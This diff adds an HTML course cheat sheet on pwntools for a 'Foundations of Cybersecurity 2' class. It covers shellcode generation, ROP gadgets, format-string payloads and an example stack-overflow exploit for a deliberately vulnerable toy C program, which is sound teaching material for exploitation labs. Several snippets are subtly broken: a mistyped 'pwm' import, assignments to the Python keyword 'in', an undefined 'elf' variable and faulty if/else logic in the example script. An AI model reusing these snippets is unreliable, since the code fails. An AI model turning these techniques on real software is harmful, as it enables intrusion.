@@ -1,0 +1,743 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Cysec2 exploitation cheat sheet</title>
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/python.min.js"></script>
+
+  <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+
+  <script>
+    hljs.highlightAll();
+    hljs.addPlugin({
+      "after:highlightElement": ({ el, text }) => {
+        const pre = el.parentElement;
+
+        if (!pre || pre.tagName !== "PRE") return;
+
+        // Avoid adding duplicate buttons if highlight runs more than once
+        if (pre.querySelector(".copy-code-button")) return;
+
+        // Make <pre> the positioning context
+        pre.style.position = "relative";
+
+        const copyButton = document.createElement("button");
+        copyButton.type = "button";
+        copyButton.className = "copy-code-button";
+
+        copyButton.innerHTML = `
+      <svg
+        xmlns="http://www.w3.org/2000/svg"
+        width="16"
+        height="16"
+        viewBox="0 0 24 24"
+        fill="none"
+        stroke="currentColor"
+        stroke-width="2"
+        stroke-linecap="round"
+        stroke-linejoin="round"
+      >
+        <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+        <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
+      </svg>
+    `;
+
+        Object.assign(copyButton.style, {
+          position: "absolute",
+          top: "0.5rem",
+          right: "0.5rem",
+          zIndex: "10",
+          padding: "0.4rem",
+          border: "none",
+          background: "transparent",
+          cursor: "pointer",
+          color: "#6b7280",
+          display: "flex",
+          alignItems: "center",
+          justifyContent: "center",
+        });
+
+        copyButton.addEventListener("mouseenter", () => {
+          copyButton.style.color = "#374151";
+        });
+
+        copyButton.addEventListener("mouseleave", () => {
+          copyButton.style.color = "#6b7280";
+        });
+
+        copyButton.addEventListener("click", async () => {
+          try {
+            await navigator.clipboard.writeText(text);
+            copyButton.innerText = "Copied!";
+            setTimeout(() => {
+              copyButton.innerHTML = `
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              width="16"
+              height="16"
+              viewBox="0 0 24 24"
+              fill="none"
+              stroke="currentColor"
+              stroke-width="2"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+            >
+              <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
+              <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
+            </svg>
+          `;
+            }, 1200);
+          } catch (err) {
+            console.error("Copy failed", err);
+          }
+        });
+
+        pre.appendChild(copyButton);
+      },
+    });
+  </script>
+  <style>
+    :root {
+      --bg: #0b1020;
+      --card: #111827;
+      --card-2: #1f2937;
+      --text: #f9fafb;
+      --muted: #9ca3af;
+      --accent: #8b5cf6;
+      --accent-light: rgba(139, 92, 246, 0.15);
+      --border: rgba(255, 255, 255, 0.2);
+      --code-bg: #050814;
+      --code-text: #e5e7eb;
+      --shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
+      --radius: 16px;
+    }
+
+    html {
+      height: 100%;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: Inter, system-ui, sans-serif;
+      background:
+        radial-gradient(circle at top right, rgba(139, 92, 246, 0.12), transparent 30%),
+        radial-gradient(circle at top left, rgba(59, 130, 246, 0.1), transparent 35%),
+        var(--bg);
+      color: var(--text);
+      line-height: 1.1;
+      padding: 12px;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .container {
+      margin: auto;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      width: 100%;
+      min-height: 0;
+    }
+
+
+    .header {
+      text-align: center;
+      margin-bottom: 1rem;
+      position: relative;
+    }
+
+    .header h1 {
+      font-size: 1.6rem;
+      color: var(--accent);
+      letter-spacing: -0.03em;
+      margin-bottom: 2px;
+    }
+
+    .header p {
+      color: var(--muted);
+      margin-top: 2px;
+      font-size: 0.75rem;
+    }
+
+    .view-toggle-btn {
+      position: absolute;
+      top: 0;
+      right: 0;
+      padding: 8px 12px;
+      background: var(--accent-light);
+      border: 1px solid var(--accent);
+      color: var(--accent);
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 0.85rem;
+      font-weight: 600;
+      transition: all 0.3s ease;
+    }
+
+    .view-toggle-btn:hover {
+      background: var(--accent);
+      color: var(--bg);
+    }
+
+    .back-btn {
+      position: absolute;
+      top: 0;
+      left: 0;
+      padding: 8px 12px;
+      background: var(--accent-light);
+      border: 1px solid var(--accent);
+      color: var(--accent);
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 0.85rem;
+      font-weight: 600;
+      transition: all 0.3s ease;
+    }
+
+    .back-btn:hover {
+      background: var(--accent);
+      color: var(--bg);
+    }
+
+    .view-container {
+      position: relative;
+      width: 100%;
+      overflow: hidden;
+      height: 100%;
+    }
+
+    .view {
+      width: 100%;
+      height: 100%;
+      transition: transform 0.5s cubic-bezier(0.4, 0.0, 0.2, 1);
+    }
+
+    .view.hidden {
+      transform: translateX(100%);
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 100%;
+    }
+
+    .view.visible {
+      transform: translateX(0);
+    }
+
+    #main-view.hidden {
+      transform: translateX(-100%);
+    }
+    
+    .code-view-container {
+      display: flex;
+      height: fit-content;
+      gap: 20px;
+      padding: 20px;
+      background: linear-gradient(180deg, var(--card), var(--card-2));
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      backdrop-filter: blur(8px);
+    }
+
+    .code-view-container h2 {
+      color: var(--accent);
+      margin-bottom: 1rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .code-view-container pre {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 16px;
+      overflow-x: auto;
+    }
+
+    .code-view-container code {
+      font-size: 0.9rem;
+      line-height: 1.5;
+    }
+
+    .split {
+      flex: 1;
+      overflow-y: auto;
+      overflow-x: hidden;
+      height: 100%;
+      width: 50%;
+    }
+
+    .left {
+      width: 50%;
+    }
+
+    .right {
+      width: 50%;
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+      gap: 1rem;
+      margin-bottom: 1rem;
+    }
+
+    .card {
+      background: linear-gradient(180deg, var(--card), var(--card-2));
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 12px;
+      box-shadow: var(--shadow);
+      backdrop-filter: blur(8px);
+      display: flex;
+      flex-direction: column;
+      break-inside: avoid;
+    }
+
+    .card h2 {
+      font-size: 0.95rem;
+      margin-bottom: 6px;
+      color: var(--accent);
+      border-bottom: 2px solid var(--accent-light);
+      padding-bottom: 3px;
+    }
+
+    .card ul {
+      list-style: none;
+      display: grid;
+      gap: 3px;
+    }
+
+    .card li {
+      padding: 6px 8px;
+      background: rgba(255, 255, 255, 0.03);
+      border-radius: 6px;
+      border: 1px solid var(--border);
+      font-size: 0.85rem;
+    }
+
+    .card p {
+      margin: 1px 0;
+      font-size: 0.85rem;
+    }
+
+    .label {
+      display: inline-block;
+      font-size: 0.65rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      color: var(--accent);
+      background: var(--accent-light);
+      padding: 3px 6px;
+      border-radius: 999px;
+      margin-bottom: 4px;
+      letter-spacing: 0.05em;
+    }
+
+    pre {
+      max-width: 100%;
+      margin: 0px 0;
+      overflow-x: auto;
+    }
+
+    code {
+      background: var(--code-bg);
+      color: var(--code-text);
+      padding: 2px;
+      border-radius: 2px;
+      font-family: "Fira Code", monospace;
+      font-size: 0.75rem;
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      white-space: pre;
+      overflow-x: auto;
+    }
+
+    .footer {
+      text-align: center;
+      margin-top: 0.5rem;
+      color: var(--muted);
+      font-size: 0.7rem;
+      flex-shrink: 0;
+    }
+
+    a {
+      color: var(--accent);
+      text-decoration: none;
+      font-size: 0.8rem;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+
+    hr {
+      border: none;
+      border-top: 2px solid var(--border);
+      margin: 2px 0;
+    }
+
+    main {
+      margin-bottom: 6px;
+      overflow-y: auto;
+    }
+
+    @media (max-width: 1200px) {
+      .grid {
+        grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      }
+    }
+
+    @media (max-width: 768px) {
+      .grid {
+        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      }
+    }
+
+    @media (max-width: 480px) {
+      .grid {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    @media print {
+      body {
+        background: #0b1020;
+        padding: 0;
+      }
+
+      .card {
+        box-shadow: none;
+        break-inside: avoid;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <header class="header">
+      <h1>Cysec2 - Pwntools & Python Cheat sheet</h1>
+      <button class="back-btn" onclick="toggleToMainView()" style="display: none;">← Back</button>
+      <button class="view-toggle-btn" onclick="toggleToCodeView()">&#8594 View example script</button>
+    </header>
+
+    <div class="view-container">
+      <main class="grid view visible" id="main-view">
+        <section class="card">
+          <h2>Setup</h2>
+          <p>Once you have python installed, you have to install the pwntools pip package (already installed in the
+            webshell)</p>
+          <ul>
+            <pre><code class="language-bash">python3 -m pip install --upgrade pip
+python3 -m pip install --upgrade pwntools</code></pre>
+            <p>Then at the start of your python script:</p>
+            <pre><code class="language-python">from pwm import *</code></pre>
+            <p>See <a href=https://docs.pwntools.com/en/stable/install.html>here</a> for more information</p>
+          </ul>
+        </section>
+        <section class="card">
+          <h2>Tubes</h2>
+          <p>Tubes are the way we interact with programs. The first thing you usually do in some pwntools code is
+            usually
+            opening your tube</p>
+          <ul>
+            <hr>
+            <p>To communicate with a local binary</p>
+            <pre><code class="language-python">r = process('./your_binary')</code></pre>
+            <hr>
+            <p>To communicate with a remote host</p>
+            <pre><code class="language-python">r = remote('cysec2.attacking.systems',1337)</code></pre>
+            <hr>
+            <p>Start a local binary with gdb</p>
+            <pre><code class="language-python">r = gdb.debug('./your_binary')</code></pre>
+            <p>If you want to use pwndbg instead of normal gdb do:</p>
+            <pre><code class="language-python">context.gdb_binary = 'pwndbg'</code></pre>
+            <p>If no gdb window opens for you, you might need to instead do:</p>
+            <pre><code class="language-python"># replace kitty with whatever terminal you are using
+context.terminal = 'kitty'
+r = gdb.debug('./your_binary')</code></pre>
+            <p>If you are on the webshell, you need to do:</p>
+            <pre><code class="language-python">context.terminal = ['tmux', 'splitw', '-h']
+r = gdb.debug('./your_binary')</code></pre>
+            <p>And then run the code with:</p>
+            <pre><code class="language-bash">tmux
+python yourcode.py</code></pre>
+            <hr>
+          </ul>
+          <a href=https://docs.pwntools.com/en/stable/tubes.html>Full documentation</a>
+        </section>
+
+        <section class="card">
+          <h2>Receiving</h2>
+          <p>Once you have opened a tube, you can receive from it with these methods. All of these return data in bytes,
+            see the conversion section on how to work with this</p>
+          <ul>
+            <hr>
+            <p>Receive up to n bytes.</p>
+            <pre><code class="language-python">in = r.recv(n)</code></pre>
+            <hr>
+            <p>Receive exactly n bytes.</p>
+            <pre><code class="language-python">in = r.recvn(n)</code></pre>
+            <hr>
+            <p>Receive up to and including a newline.</p>
+            <pre><code class="language-python">in = r.recvline()</code></pre>
+            <hr>
+            <p>Receive up to and including the string <code>prompt</code>.</p>
+            <pre><code class="language-python">in = r.recvuntil(prompt)</code></pre>
+            <hr>
+            <p>Receive up to and including something that matches <code>regex</code>.</p>
+            <pre><code class="language-python">in = r.recvregex(regex)</code></pre>
+            <hr>
+            <p>Receive everything until the connection closes.</p>
+            <pre><code class="language-python">in = r.recvall()</code></pre>
+            <hr>
+            <p>Receive everything that comes within 0.1 seconds
+            <pre><code class="language-python">in = r.recvall(timeout=0.1)</code></pre>
+            <p>
+              <hr>
+          </ul>
+          <a href=https://docs.pwntools.com/en/stable/tubes.html>Full documentation</a>
+        </section>
+
+        <section class="card">
+          <h2>Sending</h2>
+          <p>Once you have opened a tube, you can send to it with these methods. All of expect data in bytes, see the
+            conversion section on how to work with this</p>
+          <ul>
+            <hr>
+            <p>Send <code>out</code> into the tube <code>r</code></p>
+            <pre><code class="language-python">r.send(out)</code></pre>
+            <hr>
+            <p>Send <code>out + '\n'</code> into the tube <code>r</code></p>
+            <pre><code class="language-python">r.sendline(out)</code></pre>
+            <hr>
+            <p>Send <code>out + '\n'</code> as soon as <code>prompt</code> gets received</p>
+            <pre><code class="language-python">r.sendlineafter(prompt, out)</code></pre>
+            <hr>
+            <p>Drop into interactive mode. Sends everything you enter into the tube and sends everything it receives
+              back.
+              Use it once you have a shell</p>
+            <pre><code class="language-python">r.interactive()</code></pre>
+            <hr>
+          </ul>
+          <a href=https://docs.pwntools.com/en/stable/tubes.html>Full documentation</a>
+        </section>
+
+        <section class="card">
+          <h2>Conversion</h2>
+          <p>Convert between strings, bytes, and integers using these methods.</p>
+          <p>To change whether it should be little or big endian:</p>
+          <pre><code class="language-python">context.endian = 'little' # or replace with big</code></pre>
+          <ul>
+            <hr>
+            <p>String to Bytes</p>
+            <pre><code class="language-python">text = "hello"
+bytes_data = text.encode()  # b'hello'
+bytes_data = text.encode('utf-8')  # explicit encoding</code></pre>
+            <hr>
+            <p>Bytes to String</p>
+            <pre><code class="language-python">bytes_data = b"hello"
+text = bytes_data.decode()  # "hello"
+text = bytes_data.decode('utf-8')  # explicit decoding</code></pre>
+            <hr>
+            <p>Bytes to Integer</p>
+            <pre><code class="language-python">data = b"\x34\x12\x00\x00"
+num = u32(data)  # unpack 4 bytes to 32-bit int
+num = u64(data)  # unpack 8 bytes to 64-bit int</code></pre>
+            <hr>
+            <p>Integer to Bytes</p>
+            <pre><code class="language-python">addr = 0x1234
+addr = p32(num)  # pack to 4 bytes
+addr = p64(num)  # pack to 8 bytes</code></pre>
+            <hr>
+          </ul>
+        </section>
+
+        <section class="card">
+          <h2>Exploitation Help</h2>
+          <ul>
+            <p>Dump ELF symbols</p>
+            <pre><code class="language-python">e = ELF('./vuln_program')
+vuln_function_addr = e.symbols['vuln_function'] # get the address of a function
+addresses = e.search(b'/bin/sh\00') # search for a certain bytes</code></pre>
+            <p>Useful as an alternative to using objdump to get addresses</p>
+            <a href="https://docs.pwntools.com/en/latest/elf/elf.html">Full documentation</a>
+            <hr>
+            <p>Automatically create ROP chains</p>
+            <pre><code class="language-python">e = ELF('./vuln_program')
+rop = ROP(elf)
+print(rop.rdi) # prints a gadget for changing rdi (if found)
+# Gadget(0x2ccd7, ['pop rdi', 'ret'], ['rdi'], 0x8)</code></pre>
+            <p>Can do much more than just get the address for a single gadget: check </p>
+            <a href="https://docs.pwntools.com/en/latest/rop/rop.html">Full documentation</a>
+            <hr>
+            <p>Create assembly code with shellcraft</p>
+            <pre><code class="language-python">asm = shellcraft.sh()       # Generate shellcode.
+asm = shellcraft.cat(path)  # Generate assembly that dumps the file at path.
+asm = shellcraft.exit(code) # Generate assembly that exits with code code.
+asm = shellcraft.nop()      # Generate assembly for a single-byte no-op.
+bin = asm(asm)              # Assembles asm into a binary snippet.
+asm = disasm(bin)           # Disassembles bin into assembly.</code></pre>
+            <a href="https://docs.pwntools.com/en/latest/shellcraft.html">Full documentation</a>
+            <hr>
+            <p>Automatically geneate format string exploits (for complex printf exploitation)</p>
+            <pre><code class="language-python"># offset = the first formatters offset you control 
+# (so the the number of the argument, which points to the part on the stack where you can write to and also read from with a format string)
+# writes = what address to overwrite with what
+# numbwritten = the amount of bytes already written before the payload
+payload = fmtstr_payload(offset=5,writes={0x77ff: 0x1337}, numbwritten=8)</code></pre>
+            <a href="https://docs.pwntools.com/en/latest/fmtstr.html">Full documentation</a>
+            <hr>
+          </ul>
+
+      </main>
+
+      <div class="view hidden" id="code-view" style="overflow: scroll;">
+          <h1>
+            Example script
+          </h1>
+        <div class="code-view-container">
+          <div class="split left">
+            <h2>Python code to exploit vuln.c</h2>
+            <pre><code class="language-python">from pwn import *
+
+# uses pwndbg instead of normal gdb
+context.gdb_binary = 'pwndbg'
+
+# only needed if you are using non-default endianness
+context.endian = 'little'
+
+# args allows you to pass command line arguments to your script
+# if started with python3 script.py GDB, debug
+if args.GDB:
+    r = gdb.debug('./vuln', exe='./vuln')
+# if started with python3 script.py REMOTE, send data to remote
+if args.REMOTE:
+    r = remote('not-a-real-remote.attacking.systems', 1337)
+# otherwise start normally
+else:
+    r = process('./vuln')
+
+# receive the first line
+line = r.recvline().decode('utf-8')
+
+# line[:-1] to remove the newline character at the end to remove the newline character at the end
+print(f'Received: "{line[:-1]}", extracting address...')
+
+# get the 5th word and get rid of 0x
+hex_str = line.split()[4][2:]
+# convert it to an integer
+addr = int(hex_str, 16)
+
+print(f'Found addr at {hex(addr)}')
+
+# build the payload
+payload = b'A'*512 # fill the buffer
+payload += p64(addr) # overwrite into functionToCall
+
+print(f'Sending payload...')
+r.sendline(payload)
+r.recvline()
+
+print(f'Flag: {r.recvline().decode()}')
+              </code></pre>
+          </div>
+          <div class="split right">
+            <h2>vuln.c</h2>
+            <pre><code class="language-c">#include <stdio.h>
+
+void normal() {
+  printf("No!\n");
+}
+
+void printflag(){
+  printf("CYSEC2{YOU_DID_IT}\n");
+}
+
+// type for a function pointer
+typedef void func(void);
+
+struct mystruct {
+  // this data is stored right next to each other
+  char buffer[512];
+  func* functionToCall; // we want to overwrite this to call printflag instead
+};
+
+void main() {
+  struct mystruct data;
+  data.functionToCall = normal;
+  printf("The flag is at %p btw\n", &printflag);
+
+  printf("Say something: ");
+
+  // stack buffer overflow here
+  scanf("%s", data.buffer);
+
+  printf("cool\n");
+
+  // calls the function at address functionToCall
+  ((func *)data.functionToCall)();
+}</code></pre>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <footer class="footer">
+      2026 - Foundations of Cybersecurity 2
+    </footer>
+
+    <script>
+      function toggleToCodeView() {
+        const mainView = document.getElementById('main-view');
+        const codeView = document.getElementById('code-view');
+        const viewBtn = document.querySelector('.view-toggle-btn');
+        const backBtn = document.querySelector('.back-btn');
+
+        mainView.classList.remove('visible');
+        mainView.classList.add('hidden');
+        codeView.classList.remove('hidden');
+        codeView.classList.add('visible');
+        viewBtn.style.display = 'none';
+        backBtn.style.display = 'block';
+
+        // Re-highlight code if highlight.js is loaded
+        if (typeof hljs !== 'undefined') {
+          document.querySelectorAll('pre code').forEach(el => {
+            hljs.highlightElement(el);
+          });
+        }
+      }
+
+      function toggleToMainView() {
+        const mainView = document.getElementById('main-view');
+        const codeView = document.getElementById('code-view');
+        const viewBtn = document.querySelector('.view-toggle-btn');
+        const backBtn = document.querySelector('.back-btn');
+
+        codeView.classList.remove('visible');
+        codeView.classList.add('hidden');
+        mainView.classList.remove('hidden');
+        mainView.classList.add('visible');
+        viewBtn.style.display = 'block';
+        backBtn.style.display = 'none';
+      }
+    </script>
+  </div>
+</body>
+
+</html>
